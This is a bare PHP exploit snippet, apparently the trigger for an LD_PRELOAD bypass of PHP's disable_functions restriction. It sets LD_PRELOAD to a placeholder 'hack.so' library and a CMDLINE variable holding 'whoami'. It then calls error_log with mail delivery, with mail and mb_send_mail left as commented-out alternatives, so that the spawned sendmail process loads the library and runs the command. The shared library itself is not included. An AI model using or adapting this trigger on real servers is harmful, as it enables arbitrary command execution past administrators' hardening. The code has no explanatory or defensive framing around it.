<?php
error_reporting(E_ALL);
putenv("LD_PRELOAD=/path/to/hack.so");
putenv("CMDLINE=whoami");
// mail("xxx@localhost", "", "", "", "");
error_log("a", 1);
// mb_send_mail("xxx@localhost", "", "", "", "");
?>
